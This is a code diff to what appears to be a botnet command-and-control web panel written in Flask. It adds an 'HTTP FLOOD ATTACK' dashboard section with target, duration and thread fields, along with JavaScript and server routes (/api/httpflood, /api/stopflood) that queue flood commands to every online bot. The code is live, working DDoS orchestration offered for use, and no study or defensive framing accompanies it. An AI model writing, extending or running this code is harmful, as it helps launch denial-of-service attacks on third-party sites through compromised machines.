@@ -162,6 +162,20 @@ DASHBOARD = '''
             <button onclick="sendQuickCmd('ifconfig')">ifconfig</button>
         </div>
 
+        <div style="margin-bottom: 20px; border: 2px solid #ff0000; padding: 15px;">
+            <h3 style="color: #ff0000;">⚡ HTTP FLOOD ATTACK</h3>
+            <label>Target URL:</label><br>
+            <input type="text" id="flood-target" placeholder="http://target.com" style="width: 70%;">
+            <br>
+            <label>Duration (seconds):</label>
+            <input type="number" id="flood-duration" value="60" style="width: 100px;">
+            <label>Threads/Bot:</label>
+            <input type="number" id="flood-threads" value="10" style="width: 100px;">
+            <br>
+            <button onclick="startFlood()" style="background: #ff0000; color: #fff;">START FLOOD</button>
+            <button onclick="stopFlood()" style="background: #ff6600; color: #fff;">STOP FLOOD</button>
+        </div>
+
         <div>
             <label>Custom Command:</label><br>
             <input type="text" id="command" placeholder="Enter command..." style="width: 70%;">
@@ -283,6 +297,70 @@ DASHBOARD = '''
             while (log.children.length > 50) {
                 log.removeChild(log.lastChild);
             }
+        }
+        
+        function startFlood() {
+            const target = document.getElementById('flood-target').value;
+            const duration = document.getElementById('flood-duration').value;
+            const threads = document.getElementById('flood-threads').value;
+            
+            if (!target) {
+                alert('Enter target URL!');
+                return;
+            }
+            
+            if (!confirm(`Start HTTP flood on ${target} for ${duration}s?`)) {
+                return;
+            }
+            
+            addLog(`⚡ STARTING HTTP FLOOD: ${target}`);
+            
+            fetch('/api/httpflood', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    target: target,
+                    duration: parseInt(duration),
+                    threads: parseInt(threads)
+                })
+            })
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('output').textContent = 
+                    `⚡ HTTP FLOOD STARTED!\n\n` +
+                    `Target: ${data.target}\n` +
+                    `Duration: ${data.duration}s\n` +
+                    `Bots attacking: ${data.bots}\n` +
+                    `Threads per bot: ${threads}\n` +
+                    `Total threads: ${data.bots * threads}\n\n` +
+                    `Attack in progress...`;
+                addLog(`✓ Flood attack launched with ${data.bots} bots`);
+            })
+            .catch(err => {
+                addLog(`✗ Flood error: ${err}`);
+            });
+        }
+        
+        function stopFlood() {
+            if (!confirm('Stop all flood attacks?')) {
+                return;
+            }
+            
+            addLog(`🛑 Stopping all floods...`);
+            
+            fetch('/api/stopflood', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' }
+            })
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('output').textContent = 
+                    `🛑 FLOOD STOPPED\n\n${data.message}`;
+                addLog(`✓ All floods stopped`);
+            })
+            .catch(err => {
+                addLog(`✗ Stop error: ${err}`);
+            });
         }
         
         // Auto-refresh
@@ -478,6 +556,57 @@ def api_broadcast():
             results[bots[bot_id]['name']] = result
     
     return jsonify({"status": "success", "results": results})
+
+@app.route('/api/httpflood', methods=['POST'])
+def api_httpflood():
+    """Start HTTP flood attack on target"""
+    data = request.json
+    target = data.get('target')
+    duration = data.get('duration', 60)  # Default 60 seconds
+    threads = data.get('threads', 10)    # Default 10 threads per bot
+    
+    print(f"[⚡] HTTP FLOOD: {target} for {duration}s with {threads} threads/bot")
+    
+    # Send flood command to all online bots
+    online_bots = [bid for bid, info in bots.items() if info['status'] == 'online']
+    
+    for bot_id in online_bots:
+        cmd_id = f"{time.time()}_{bot_id}"
+        
+        commands_queue[bot_id].append({
+            "id": cmd_id,
+            "command": f"httpflood|{target}|{duration}|{threads}",
+            "type": "flood"
+        })
+    
+    return jsonify({
+        "status": "success",
+        "message": f"HTTP flood started on {len(online_bots)} bots",
+        "bots": len(online_bots),
+        "target": target,
+        "duration": duration
+    })
+
+@app.route('/api/stopflood', methods=['POST'])
+def api_stopflood():
+    """Stop all flood attacks"""
+    print(f"[🛑] STOPPING ALL FLOODS")
+    
+    online_bots = [bid for bid, info in bots.items() if info['status'] == 'online']
+    
+    for bot_id in online_bots:
+        cmd_id = f"{time.time()}_{bot_id}"
+        
+        commands_queue[bot_id].append({
+            "id": cmd_id,
+            "command": "stopflood",
+            "type": "flood"
+        })
+    
+    return jsonify({
+        "status": "success",
+        "message": f"Stop signal sent to {len(online_bots)} bots"
+    })
 
 if __name__ == '__main__':
     print("=" * 60)
